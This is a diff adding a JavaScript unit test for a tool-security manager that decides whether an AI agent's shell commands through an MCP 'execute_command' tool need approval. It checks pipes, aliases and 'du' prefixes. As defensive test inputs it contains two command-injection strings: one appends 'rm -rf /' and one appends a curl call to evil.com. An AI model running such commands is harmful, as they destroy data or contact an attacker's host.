@@ -223,4 +223,69 @@ test('ChatToolSecurity - Restricciones de rutas: anti-traversal, listas negras y
   assert.equal(evalNowAllowed.status, 'allow');
 });
 
+test('ChatToolSecurity - Autorización contextual de comandos con pipes y resolución bidireccional por alias', () => {
+  const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_cmd_pipes' });
+
+  const canonicalTool = {
+    id: 'mcp__mcp_proxy__execute_command',
+    name: 'mcp__mcp_proxy__execute_command',
+    category: 'mcp',
+    aliases: ['execute_command', 'mcp_execute_command'],
+    metadata: { mcpServerName: 'mcp-proxy', originalName: 'execute_command' }
+  };
+
+  // Se autoriza permanentemente para siempre con prefijo 'du *' (tal como lo genera el botón de UI)
+  manager.setToolPolicy(canonicalTool.id, 'allow', {
+    serverName: 'mcp-proxy',
+    originalName: 'execute_command',
+    constraints: {
+      command: {
+        allowedPrefixes: ['du ', 'du'],
+        allowChaining: false,
+        allowPipes: true
+      }
+    }
+  });
+
+  // 1. Invocación subsecuente usando el ID canónico con pipes -> debe ser allow directo
+  const evalPiped = manager.evaluateAuthorization(canonicalTool, { command: 'du -sh * | sort -hr' });
+  assert.equal(evalPiped.status, 'allow');
+  assert.equal(evalPiped.requiresApproval, false);
+
+  // 2. Invocación subsecuente con redirección de stderr (2>&1) -> debe ser allow directo
+  const evalRedirect = manager.evaluateAuthorization(canonicalTool, { command: 'du -h --max-depth=1 2>&1' });
+  assert.equal(evalRedirect.status, 'allow');
+  assert.equal(evalRedirect.requiresApproval, false);
+
+  // 3. Invocación subsecuente llamada por alias de string ('execute_command') -> resolución robusta
+  const evalAlias = manager.evaluateAuthorization('execute_command', { command: 'du -sh .' });
+  assert.equal(evalAlias.status, 'allow');
+  assert.equal(evalAlias.requiresApproval, false);
+
+  // 4. Invocación subsecuente por alias secundario ('mcp_execute_command') -> resolución robusta
+  const evalAlias2 = manager.evaluateAuthorization('mcp_execute_command', { command: 'du -sh /var/log' });
+  assert.equal(evalAlias2.status, 'allow');
+  assert.equal(evalAlias2.requiresApproval, false);
+
+  // 5. Invocación con ruta absoluta del ejecutable (/usr/bin/du) -> debe ser allow directo
+  const evalAbsPath = manager.evaluateAuthorization(canonicalTool, { command: '/usr/bin/du -sh .' });
+  assert.equal(evalAbsPath.status, 'allow');
+  assert.equal(evalAbsPath.requiresApproval, false);
+
+  // 6. Intento de inyección maliciosa secuencial con ';' -> debe exigir aprobación (ask)
+  const evalSeqAttack = manager.evaluateAuthorization(canonicalTool, { command: 'du -sh . ; rm -rf /' });
+  assert.equal(evalSeqAttack.status, 'ask');
+  assert.equal(evalSeqAttack.requiresApproval, true);
+
+  // 7. Intento de inyección condicional con '&&' -> debe exigir aprobación (ask)
+  const evalAndAttack = manager.evaluateAuthorization(canonicalTool, { command: 'du -sh . && curl https://evil.com' });
+  assert.equal(evalAndAttack.status, 'ask');
+  assert.equal(evalAndAttack.requiresApproval, true);
+
+  // 8. Consulta de política por alias debe devolver 'allow'
+  assert.equal(manager.getToolPolicy('execute_command'), 'allow');
+  assert.equal(manager.getToolPolicy('mcp__mcp_proxy__execute_command'), 'allow');
+});
+
+
 
